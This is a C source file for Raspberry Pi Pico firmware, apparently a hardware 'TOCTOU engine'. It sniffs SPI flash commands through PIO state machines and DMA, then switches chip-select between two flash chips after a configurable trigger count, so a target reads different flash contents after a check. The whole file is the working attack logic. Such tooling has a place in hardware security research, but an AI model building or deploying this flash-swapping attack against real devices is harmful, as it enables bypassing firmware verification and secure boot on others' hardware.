#include "toctou_engine.h"
#include "toctou_habr.pio.h"

#include "hardware/pio.h"
#include "hardware/dma.h"
#include "hardware/gpio.h"
#include "hardware/clocks.h"
#include "pico/time.h"

#include <stdio.h>
#include <string.h>

#define PIO_TOCTOU pio1

#define SM_CSRP 0
#define SM_CMDA 1
#define SM_SWTH 2
#define SM_DBUG 3

static bool s_initialized = false;
static bool s_armed = false;
static uint32_t s_trigger = TOCTOU_DEFAULT_TRIGGER;
static uint32_t s_count = TOCTOU_DEFAULT_COUNT;

static int s_offset_csrp = -1;
static int s_offset_cmda = -1;
static int s_offset_swth = -1;
static int s_offset_dbug = -1;

static int s_dma_chan_cmd = -1;
static int s_dma_chan_dbg = -1;

#define DEBUG_BUF_SIZE 256
static uint16_t s_debug_buffer[DEBUG_BUF_SIZE];
static uint32_t s_debug_head = 0;

static void set_sm_reg_y(PIO pio, uint sm, uint32_t val) {
    pio_sm_put_blocking(pio, sm, val);
    pio_sm_exec(pio, sm, pio_encode_pull(false, false));
    pio_sm_exec(pio, sm, pio_encode_out(pio_y, 32));
}

static void set_sm_reg_isr(PIO pio, uint sm, uint32_t val) {
    pio_sm_put_blocking(pio, sm, val);
    pio_sm_exec(pio, sm, pio_encode_pull(false, false));
    pio_sm_exec(pio, sm, pio_encode_out(pio_isr, 32));
}

void toctou_engine_init(void) {
    if (s_initialized) return;

    // CS pins setup: pull-ups keep unselected flash deasserted (high)
    gpio_init(TOCTOU_PIN_CS);
    gpio_set_dir(TOCTOU_PIN_CS, GPIO_IN);
    gpio_disable_pulls(TOCTOU_PIN_CS);

    gpio_init(TOCTOU_PIN_CS0);
    gpio_init(TOCTOU_PIN_CS1);
    gpio_set_dir(TOCTOU_PIN_CS0, GPIO_IN);
    gpio_set_dir(TOCTOU_PIN_CS1, GPIO_IN);
    gpio_pull_up(TOCTOU_PIN_CS0);
    gpio_pull_up(TOCTOU_PIN_CS1);

    gpio_init(TOCTOU_PIN_MOSI);
    gpio_set_dir(TOCTOU_PIN_MOSI, GPIO_IN);
    gpio_disable_pulls(TOCTOU_PIN_MOSI);

    gpio_init(TOCTOU_PIN_SCK);
    gpio_set_dir(TOCTOU_PIN_SCK, GPIO_IN);
    gpio_disable_pulls(TOCTOU_PIN_SCK);

    gpio_init(TOCTOU_PIN_MISO);
    gpio_set_dir(TOCTOU_PIN_MISO, GPIO_IN);
    gpio_disable_pulls(TOCTOU_PIN_MISO);

    // 1. CS Repeater
    s_offset_csrp = pio_add_program(PIO_TOCTOU, &cs_repeater_program);
    pio_sm_config c_csrp = cs_repeater_program_get_default_config(s_offset_csrp);
    sm_config_set_jmp_pin(&c_csrp, TOCTOU_PIN_CS);
    sm_config_set_sideset_pins(&c_csrp, TOCTOU_PIN_CS0);
    pio_gpio_init(PIO_TOCTOU, TOCTOU_PIN_CS0);
    pio_gpio_init(PIO_TOCTOU, TOCTOU_PIN_CS1);
    pio_sm_init(PIO_TOCTOU, SM_CSRP, s_offset_csrp, &c_csrp);

    // 2. SPI Command Sniffer
    s_offset_cmda = pio_add_program(PIO_TOCTOU, &spi_sniffer_program);
    pio_sm_config c_cmda = spi_sniffer_program_get_default_config(s_offset_cmda);
    sm_config_set_in_shift(&c_cmda, false, true, 32);
    sm_config_set_in_pins(&c_cmda, TOCTOU_PIN_MOSI);
    pio_sm_init(PIO_TOCTOU, SM_CMDA, s_offset_cmda, &c_cmda);

    // 3. CS Switcher
    s_offset_swth = pio_add_program(PIO_TOCTOU, &cs_switcher_program);
    pio_sm_config c_swth = cs_switcher_program_get_default_config(s_offset_swth);
    sm_config_set_out_shift(&c_swth, false, true, 32);
    sm_config_set_set_pins(&c_swth, TOCTOU_PIN_CS0, 2);
    sm_config_set_in_pins(&c_swth, TOCTOU_PIN_MOSI);
    pio_sm_init(PIO_TOCTOU, SM_SWTH, s_offset_swth, &c_swth);

    // 4. SPI Debug pattern capture
    s_offset_dbug = pio_add_program(PIO_TOCTOU, &spi_debug_program);
    pio_sm_config c_dbug = spi_debug_program_get_default_config(s_offset_dbug);
    sm_config_set_in_shift(&c_dbug, false, true, 16);
    sm_config_set_out_shift(&c_dbug, false, true, 12);
    pio_sm_init(PIO_TOCTOU, SM_DBUG, s_offset_dbug, &c_dbug);

    // Setup DMA channel from sniffer RX to switcher TX
    s_dma_chan_cmd = dma_claim_unused_channel(true);
    dma_channel_config dmac_cmd = dma_channel_get_default_config(s_dma_chan_cmd);
    channel_config_set_transfer_data_size(&dmac_cmd, DMA_SIZE_32);
    channel_config_set_read_increment(&dmac_cmd, false);
    channel_config_set_write_increment(&dmac_cmd, false);
    channel_config_set_dreq(&dmac_cmd, pio_get_dreq(PIO_TOCTOU, SM_CMDA, false));
    dma_channel_configure(
        s_dma_chan_cmd, &dmac_cmd,
        &PIO_TOCTOU->txf[SM_SWTH],
        &PIO_TOCTOU->rxf[SM_CMDA],
        0xFFFFFFFF,
        false
    );

    s_initialized = true;
}

bool toctou_engine_configure(uint32_t trigger, uint32_t count) {
    if (s_armed) return false;
    s_trigger = trigger;
    s_count = count;
    return true;
}

bool toctou_engine_arm(void) {
    if (!s_initialized) toctou_engine_init();
    if (s_armed) return true;

    // Program trigger and count values into CS switcher SM
    set_sm_reg_y(PIO_TOCTOU, SM_SWTH, s_trigger);
    set_sm_reg_isr(PIO_TOCTOU, SM_SWTH, s_count);

    // Debug matcher pattern: 0x3D (Cmd 0x03, addr high nibble 0xD)
    set_sm_reg_y(PIO_TOCTOU, SM_DBUG, 0x03Du);

    // Start DMA pump
    dma_channel_start(s_dma_chan_cmd);

    // Enable all state machines
    pio_sm_set_enabled(PIO_TOCTOU, SM_CSRP, true);
    pio_sm_set_enabled(PIO_TOCTOU, SM_CMDA, true);
    pio_sm_set_enabled(PIO_TOCTOU, SM_SWTH, true);
    pio_sm_set_enabled(PIO_TOCTOU, SM_DBUG, true);

    s_armed = true;
    return true;
}

void toctou_engine_disarm(void) {
    if (!s_initialized || !s_armed) return;

    pio_sm_set_enabled(PIO_TOCTOU, SM_CSRP, false);
    pio_sm_set_enabled(PIO_TOCTOU, SM_CMDA, false);
    pio_sm_set_enabled(PIO_TOCTOU, SM_SWTH, false);
    pio_sm_set_enabled(PIO_TOCTOU, SM_DBUG, false);

    dma_channel_abort(s_dma_chan_cmd);

    // Release CS pins back to input
    gpio_set_dir(TOCTOU_PIN_CS0, GPIO_IN);
    gpio_set_dir(TOCTOU_PIN_CS1, GPIO_IN);
    gpio_pull_up(TOCTOU_PIN_CS0);
    gpio_pull_up(TOCTOU_PIN_CS1);

    s_armed = false;
}

bool toctou_engine_is_armed(void) {
    return s_armed;
}

void toctou_engine_status_json(char *out, size_t capacity) {
    snprintf(out, capacity,
        "{\"armed\":%s,\"trigger\":\"0x%08lX\",\"switch_count\":%lu,\"pins\":{\"cs_in\":%u,\"clk\":%u,\"mosi\":%u,\"miso\":%u,\"cs0\":%u,\"cs1\":%u}}",
        s_armed ? "true" : "false",
        (unsigned long)s_trigger,
        (unsigned long)s_count,
        TOCTOU_PIN_CS, TOCTOU_PIN_SCK, TOCTOU_PIN_MOSI, TOCTOU_PIN_MISO, TOCTOU_PIN_CS0, TOCTOU_PIN_CS1
    );
}

size_t toctou_engine_read_debug(uint16_t *out, size_t max_words) {
    if (!s_initialized || !s_armed || !out || !max_words) return 0;
    size_t count = 0;
    while (count < max_words && !pio_sm_is_rx_fifo_empty(PIO_TOCTOU, SM_DBUG)) {
        out[count++] = (uint16_t)pio_sm_get(PIO_TOCTOU, SM_DBUG);
    }
    return count;
}
